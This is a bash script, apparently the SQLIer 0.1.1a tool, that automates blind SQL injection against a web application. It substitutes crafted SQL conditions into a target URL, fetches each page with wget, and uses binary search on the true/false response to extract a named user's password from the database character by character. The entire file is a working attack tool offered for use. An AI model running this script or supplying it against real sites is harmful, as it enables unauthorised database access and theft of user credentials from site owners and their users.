#!/bin/bash

#
# SQLIer - Version 0.1.1a
#
# Author: Brad Cable
# Email: brad@bcable.net
# License: Modified BSD
# License Details:
# http://bcable.net/license.php
#

wgetopts="$1"
url="`echo "$2" | sed "s/ /%20/g"`"
password="$3"
istrue="$4"
username="$5"

function ord(){ echo -n $1 | od -d | sed -r "s/[ ]+/ /g" | awk "{print \$2}" | grep -v "^$"; }

i=1
userstr="concat("
while [ "$i" -le "${#username}" ]; do
	userstr+="char("`ord ${username:$i-1:1}`"),"
	let i+=1
done
userstr="${userstr:0:${#userstr}-1})"

url="`echo "$url" | sed -r "s/XXusernameXX/$userstr/g"`"
#echo $url
#exit

function inject(){
	passstr="ord(substring($password,$1,1))>$2"
	url="`echo "$url" | sed -r "s/XXpasswordXX/$passstr/g"`"
	wgetcmd="wget $wgetopts -q -O /dev/stdout \"$url\""
	out="`eval "$wgetcmd"`"
	tof=""
	[ ! -z "`echo "$out" | grep -E "$istrue"`" ] && tof=1
	echo "$tof"
}

charno=1

echo -n "$username:"
while [ ! -z "`inject $charno 0`" ]; do
	min=0
	max=128
	while let c=$max-1 && [ "$c" != "$min" ]; do
		let check=($max+$min)/2
		[ ! -z "`inject $charno $check`" ] && min="$check" || max="$check"
	done
	chr="`echo "print chr($max)" | python`"
	echo -n $chr
	let charno+=1
done
let passlen=$charno-1
echo
